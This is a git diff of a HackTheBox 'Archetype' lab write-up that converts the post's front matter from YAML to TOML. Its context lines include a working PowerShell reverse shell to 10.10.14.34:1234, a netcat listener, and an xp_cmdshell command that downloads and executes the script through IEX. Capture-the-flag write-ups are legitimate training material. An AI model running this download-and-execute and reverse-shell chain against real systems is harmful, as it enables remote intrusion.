@@ -1,7 +1,7 @@
----
-title: "HackTheBox Write-up&mdash;Archetype"
-date: 2021-03-22
----
++++
+title = "HackTheBox Write-up&mdash;Archetype"
+date = 2021-03-22
++++
 
 I am going to have a quick night of attempting the "Starting Point" machines in HackTheBox.  These machines I didn't see when I first started using HackTheBox, but they seem to be valuable in understanding the usual layout of these kinds of machines.  I think they are of a common author, too.  And I do believe this particular machine is made by the person who made HackTheBox.  So with all that in mind, here goes!
 
@@ -28,7 +28,7 @@ I am going to have a quick night of attempting the "Starting Point" machines in 
     ```powershell
     $client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
     ```
-     Notice that we have your `tun0` IP, with some port number (here we have chosen `1234`) near the start of the file; 
+     Notice that we have your `tun0` IP, with some port number (here we have chosen `1234`) near the start of the file;
 11. On your computer, we need to set up an http server for later; run `sudo python3 -m http.server 80`. Ensure you run this in the same directory as your reverse powershell script from the previous step;
 12. Also on your computer, we will need a netcat listener; run `nc -nvlp 1234` (or exchange `1234` with the port you chose two steps ago. Note that in the verbatim version, I used this along with `rlwrap` to make this step nicer);
 13. Back in the SQL window, now run `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");`" in order to transfer the reverse powershell script to the SQL database;
